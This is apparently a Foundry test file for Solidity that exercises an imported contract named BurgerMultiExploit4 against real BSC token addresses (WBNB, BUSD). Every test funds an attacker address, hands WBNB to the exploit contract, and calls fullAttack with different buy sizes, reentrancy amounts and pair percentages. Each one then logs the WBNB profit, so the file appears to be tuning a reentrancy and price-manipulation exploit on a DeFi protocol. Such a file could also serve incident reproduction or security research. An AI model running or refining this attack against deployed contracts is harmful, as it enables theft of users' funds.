// SPDX-License-Identifier: MIT
pragma solidity ^0.8.23;

import "forge-std/Test.sol";
import "./BurgerMultiTest4.t.sol";

contract BurgerMultiTest5 is Test {
    address constant WBNB = 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c;
    address constant BUSD = 0xe9e7CEA3DedcA5984780Bafc599bD69ADd087D56;

    // Try high pairPct (put most BUSD into pair, less for reentrancy)
    function test_busd_high_pair() public {
        address att = makeAddr("att");
        vm.deal(att, 2000 ether);
        vm.startPrank(att);

        BurgerMultiExploit4 e = new BurgerMultiExploit4();
        IWBNB(WBNB).deposit{value: 1500 ether}();
        IWBNB(WBNB).transfer(address(e), 1500 ether);

        uint256 wbnbBefore = IWBNB(WBNB).balanceOf(address(e));

        // pairPct=80: most BUSD goes to FakeToken/BUSD pair
        e.fullAttack(BUSD, 150 ether, 30 ether, 80);

        uint256 wbnbAfter = IWBNB(WBNB).balanceOf(address(e));
        emit log_named_int("WBNB delta (pairPct=80)", int256(wbnbAfter) - int256(wbnbBefore));
        vm.stopPrank();
    }

    // Try low buy, high pair %
    function test_busd_low_buy() public {
        address att = makeAddr("att");
        vm.deal(att, 2000 ether);
        vm.startPrank(att);

        BurgerMultiExploit4 e = new BurgerMultiExploit4();
        IWBNB(WBNB).deposit{value: 1500 ether}();
        IWBNB(WBNB).transfer(address(e), 1500 ether);

        uint256 wbnbBefore = IWBNB(WBNB).balanceOf(address(e));

        // Small buy, most to pair
        e.fullAttack(BUSD, 50 ether, 20 ether, 90);

        uint256 wbnbAfter = IWBNB(WBNB).balanceOf(address(e));
        emit log_named_int("WBNB delta (low buy)", int256(wbnbAfter) - int256(wbnbBefore));
        vm.stopPrank();
    }

    // What about very large buy (buy most of the BUSD pool)?
    function test_busd_large_buy() public {
        address att = makeAddr("att");
        vm.deal(att, 2000 ether);
        vm.startPrank(att);

        BurgerMultiExploit4 e = new BurgerMultiExploit4();
        IWBNB(WBNB).deposit{value: 1800 ether}();
        IWBNB(WBNB).transfer(address(e), 1800 ether);

        uint256 wbnbBefore = IWBNB(WBNB).balanceOf(address(e));

        // Large buy, moderate pair
        e.fullAttack(BUSD, 500 ether, 50 ether, 50);

        uint256 wbnbAfter = IWBNB(WBNB).balanceOf(address(e));
        emit log_named_int("WBNB delta (large buy)", int256(wbnbAfter) - int256(wbnbBefore));
        vm.stopPrank();
    }
}
